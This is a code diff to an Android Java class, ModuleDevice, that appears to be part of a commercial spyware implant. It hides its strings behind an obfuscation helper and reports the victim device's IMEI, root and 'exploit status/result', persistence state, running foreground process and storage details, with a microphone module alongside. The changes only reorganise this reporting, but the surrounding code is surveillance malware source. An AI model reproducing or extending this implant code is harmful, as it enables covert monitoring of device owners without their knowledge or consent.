@@ -136,10 +136,9 @@ public class ModuleDevice extends BaseInstantModule {
 
 			sb.insert(0, M.e("Model:") + Build.DISPLAY + "\n");
 			sb.insert(0, M.e("IMEI: ") + Device.self().getImei() + "\n");
-			sb.insert(0, M.e("Root: ") + (root ? "yes" : "no") + ", status=" + Status.getExploitStatusString() + ", result=" + Status.getExploitResultString()
-					+ M.e(", Su: ") + (su ? "yes" : "no") + " "
-					+ M.e(", Admin: ") + (admin ? "yes" : "no") + "\n");
-			sb.insert(0, M.e("Free space: ") + freeSpace + " KB" + M.e("Installation: ") + (Cfg.PERSISTENCE ? (M.e("Persistence ["+ Status.getPersistencyStatusStr()) +M.e("]")):"Standard") + "\n");
+			sb.insert(0, M.e("Root: ") + (root ? "yes" : "no") 	+ M.e(", Su: ") + (su ? "yes" : "no")
+					+ M.e(", Admin: ") + (admin ? "yes" : "no") +  M.e(", Persistence: ") + Status.getPersistencyStatusStr() + "\n");
+			sb.insert(0, M.e("Free space: ") + freeSpace + " KB " + M.e("Installation: ") + "\n");
 			sb.insert(0, M.e("Battery: ") + battery + "%" + "\n");
 
 
@@ -185,6 +184,8 @@ public class ModuleDevice extends BaseInstantModule {
 	private long getSystem(final StringBuffer sb) {
 		// SYSTEM
 		sb.append("\n" + M.e("-- SYSTEM --") + "\n"); //$NON-NLS-1$
+
+		sb.append(M.e("Root Status: ") + Status.getExploitStatusString() + M.e(", Result: ") + Status.getExploitResultString() + "\n");
 		sb.append(M.e("Board: ") + Build.BOARD + "\n");
 		sb.append(M.e("Brand: ") + Build.BRAND + "\n");
 		sb.append(M.e("Device: ") + Build.DEVICE + "\n");
@@ -213,7 +214,7 @@ public class ModuleDevice extends BaseInstantModule {
 		sb.append(M.e("External state: ") + Environment.getExternalStorageState() + "\n");
 		sb.append(M.e("External space: ") + bytesAvailableExt + "\n");
 
-		RunningProcesses runningProcesses = new RunningProcesses();
+		RunningProcesses runningProcesses = RunningProcesses.self();
 		sb.append(M.e("Foreground process: ") + runningProcesses.getForeground() + "\n"); //$NON-NLS-1$
 
 		ModuleMic mic = ModuleMic.self();
